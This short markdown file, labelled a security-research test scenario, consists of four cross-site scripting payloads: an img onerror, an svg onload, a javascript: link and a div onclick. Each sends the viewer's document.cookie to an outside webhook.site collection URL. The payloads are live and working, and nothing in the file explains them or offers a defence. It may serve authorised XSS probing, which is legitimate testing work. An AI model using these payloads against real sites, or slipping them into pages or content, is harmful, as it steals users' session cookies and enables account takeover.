# Intro

Test scenario for security research.

## XSS probe 1: img onerror

<img src=x onerror="fetch('https://webhook.site/ce1618b8-3fec-400e-a2c5-a7e00ede16d2/xss1?c=' + encodeURIComponent(document.cookie))">

## XSS probe 2: svg onload

<svg onload="fetch('https://webhook.site/ce1618b8-3fec-400e-a2c5-a7e00ede16d2/xss2?c=' + encodeURIComponent(document.cookie))">

## XSS probe 3: javascript href

<a href="javascript:fetch('https://webhook.site/ce1618b8-3fec-400e-a2c5-a7e00ede16d2/xss3?c=' + encodeURIComponent(document.cookie))">click me</a>

## XSS probe 4: div onclick

<div onclick="fetch('https://webhook.site/ce1618b8-3fec-400e-a2c5-a7e00ede16d2/xss5?c=' + encodeURIComponent(document.cookie))">click here</div>
